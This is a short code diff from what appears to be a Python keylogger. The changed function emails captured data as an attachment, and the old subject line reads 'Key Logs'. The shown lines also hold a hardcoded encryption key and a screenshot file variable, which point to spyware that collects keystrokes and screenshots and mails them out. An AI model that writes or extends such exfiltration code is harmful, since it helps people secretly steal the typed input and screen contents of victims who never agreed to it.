@@ -42,12 +42,12 @@ screenshot_info = "screenshot.png"
 key = "7LBG7bqMkRqedGjS3h717rgono_TlKbRaxZVBzGCZXM="
 
 # sending email functionality 
-def send_email(filename, attachment, toaddr):
+def send_email(filename, attachment, toaddr, subject):
     from_addr = email_address
     msg = MIMEMultipart()
     msg['From'] = from_addr
     msg['To'] = to_addr
-    msg['Subject'] = "Key Logs"
+    msg['Subject'] = subject
     body = "Information provided in attachemnt below"
     msg.attach(MIMEText(body, 'plain'))
     filename = filename
